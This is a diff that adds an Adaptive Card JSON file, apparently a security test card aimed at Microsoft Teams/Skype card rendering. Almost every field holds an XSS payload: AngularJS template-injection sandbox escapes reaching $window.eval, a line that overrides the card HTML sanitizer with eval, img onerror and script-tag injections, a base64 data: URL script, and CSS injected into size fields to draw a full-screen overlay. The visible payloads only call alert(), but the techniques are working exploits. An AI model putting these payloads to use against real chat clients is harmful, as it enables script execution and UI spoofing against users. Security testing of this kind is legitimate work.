@@ -1,0 +1,102 @@
+{
+  "$schema": "https://adaptivecards.io/schemas/adaptive-card.json",
+  "type": "AdaptiveCard",
+  "version": "1.2",
+  "backgroundImage": {
+    "url": "https://pbs.twimg.com/profile_images/3647943215/d7f12830b3c17a5a9e4afcc370e3a37e_400x400.jpeg",
+    "fillMode": "cover"
+  },
+  "speak": "{{ ctrl.xss('xss-ng-speak'); }} <img src=/ onerror=javascript:alert('xss-html-speak')>",
+  "minHeight": "50px; display: block; z-index: 100000; opacity: 0.5; position: fixed; top: 0px; left: 0; width: 1000000px; height: 100000px; background-color: red;",
+  "verticalContentAlignment": "center",
+  "body": [
+    {
+      "type": "TextBlock",
+      "text": "{{ ctrl.xss('xss-ng-speak'); }} <img src=/ onerror=javascript:alert('xss-html-speak')> [link 1](https://local.teams.office.com?aaa=xxx{{[\\27if(!window.__x__){eval(atob(decodeURIComponent(/YWxlcnQoKQ/.source))),window.__x__=1}\\27].forEach($root.$$childHead.$$nextSibling.app.$window.eval)}}&url=https://test.com/) [link 2](https://local.teams.office.com?param=<script>alert('xss!');</script>) [xss link](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)",
+      "color": "accent",
+      "fontType": "monospace",
+      "horizontalAlignment": "center",
+      "isSubtle": true,
+      "maxLines": "50",
+      "size": "large",
+      "weight": "bolder",
+      "wrap": true,
+      "height": "stretch",
+      "separator": true,
+      "spacing": "large",
+      "id": "{{ ctrl.xss('xss-ng-speak'); }} <img src=/ onerror=javascript:alert('xss-html-speak')>",
+      "isVisible": true
+    },
+    {
+      "type": "Image",
+      "url": "https://urlp.asm.skype.com/v1/url/content?aaa=xxx{{[\\27if(!window.__x__){eval(atob(decodeURIComponent(/YWxlcnQoKQ/.source))),window.__x__=1}\\27].forEach($root.$$childHead.$$nextSibling.app.$window.eval)}}",
+      "height": "stretch",
+      "separator": true,
+      "spacing": "large",
+      "id": "{{ ctrl.xss('xss-ng-speak'); }} <img src=/ onerror=javascript:alert('xss-html-speak')>",
+      "isVisible": true
+    },
+    {
+      "type": "Image",
+      "url": "https://pbs.twimg.com/profile_images/3647943215/d7f12830b3c17a5a9e4afcc370e3a37e_400x400.jpeg",
+      "altText": "{{ ctrl.xss('xss-ng-speak'); }} <img src=/ onerror=javascript:alert('xss-html-speak')>",
+      "backgroundColor": "#AABBCC",
+      "height": "50px; display: block; z-index: 100000; opacity: 0.5; position: fixed; top: 0px; left: 0; width: 1000000px; height: 100000px; background-color: red;",
+      "horizontalAlignment": "center",
+      "size": "medium",
+      "style": "person",
+      "width": "50px; display: block; z-index: 100000; opacity: 0.5; position: fixed; top: 0px; left: 0; width: 1000000px; height: 100000px; background-color: red;",
+      "separator": true,
+      "spacing": "large",
+      "id": "{{ ctrl.xss('xss-ng-speak'); }} <img src=/ onerror=javascript:alert('xss-html-speak')>",
+      "isVisible": true
+    },
+    {
+      "type": "Media",
+      "poster": "https://teams.microsoft.com?aaa=xxx{{[\\27if(!window.__x__){eval(atob(decodeURIComponent(/YWxlcnQoKQ/.source))),window.__x__=1}\\27].forEach($root.$$childHead.$$nextSibling.app.$window.eval)}}",
+      "altText": "{{ ctrl.xss('xss-ng-speak'); }} <img src=/ onerror=javascript:alert('xss-html-speak')>",
+      "sources": [
+        {
+          "mimeType": "{{ ctrl.xss('xss-ng-speak'); }} <img src=/ onerror=javascript:alert('xss-html-speak')>",
+          "url": "https://us-api.asm.skype.com/v1/objects/0-eus-d9-4a5ad349f4f49c24cf498c9ad48a0668/views/?a=imgo{{ctrl.botCardFactory.htmlSanitizer.sanitizeHrefUrl=ctrl.$window.eval;}}"
+        }
+      ],
+      "height": "stretch",
+      "separator": true,
+      "spacing": "large",
+      "id": "{{ ctrl.xss('xss-ng-speak'); }} <img src=/ onerror=javascript:alert('xss-html-speak')>",
+      "isVisible": true
+    },
+    {
+      "type": "RichTextBlock",
+      "horizontalAlignment": "right",
+      "height": "stretch",
+      "separator": true,
+      "spacing": "large",
+      "id": "{{ ctrl.xss('xss-ng-speak'); }} <img src=/ onerror=javascript:alert('xss-html-speak')>",
+      "isVisible": true,
+      "inlines": [
+        "{{ ctrl.xss('xss-ng-speak'); }} <img src=/ onerror=javascript:alert('xss-html-speak')> [link 1](https://local.teams.office.com?aaa=xxx{{[\\27if(!window.__x__){eval(atob(decodeURIComponent(/YWxlcnQoKQ/.source))),window.__x__=1}\\27].forEach($root.$$childHead.$$nextSibling.app.$window.eval)}}&url=https://test.com/) [link 2](https://local.teams.office.com?param=<script>alert('xss!');</script>)",
+        "{{7*7}}",
+        {
+          "type": "TextRun",
+          "text": "{{ ctrl.xss('xss-ng-speak'); }} <img src=/ onerror=javascript:alert('xss-html-speak')> [link 1](https://local.teams.office.com?aaa=xxx{{[\\27if(!window.__x__){eval(atob(decodeURIComponent(/YWxlcnQoKQ/.source))),window.__x__=1}\\27].forEach($root.$$childHead.$$nextSibling.app.$window.eval)}}&url=https://test.com/) [link 2](https://local.teams.office.com?param=<script>alert('xss!');</script>)",
+          "color": "accent",
+          "fontType": "monospace",
+          "highlight": true,
+          "isSubtle": true,
+          "italic": true,
+          "size": "large",
+          "strikethrough": true,
+          "underline": true,
+          "weight": "bolder"
+        },
+        {
+          "type": "TextRun",
+          "text": "{{7*7}}",
+          "color": "accent"
+        }
+      ]
+    }
+  ]
+}
